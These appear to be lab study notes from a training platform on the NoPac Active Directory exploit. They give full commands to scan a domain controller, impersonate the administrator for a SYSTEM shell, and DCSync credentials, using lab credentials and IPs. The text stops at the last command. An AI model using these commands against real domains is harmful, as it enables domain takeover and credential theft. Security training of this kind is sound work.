# NoPac (SamAccountName Spoofing)
##### NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:
### Ensuring Impacket is Installed

```bash
Yashfren@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
Yashfren@htb[/htb]$ python setup.py install 
```
### Cloning the NoPac Exploit Repo

```bash
Yashfren@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

###### Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.
### Scanning for NoPac

```bash
Yashfren@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```
###### There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.
### Running NoPac & Getting a Shell

```bash
Yashfren@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

```
###### We will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.
###### It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.
### Confirming the Location of Saved Tickets

```bash
Yashfren@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```
###### We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.
### Using noPac to DCSync the Built-in Administrator Account

```
Yashfren@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
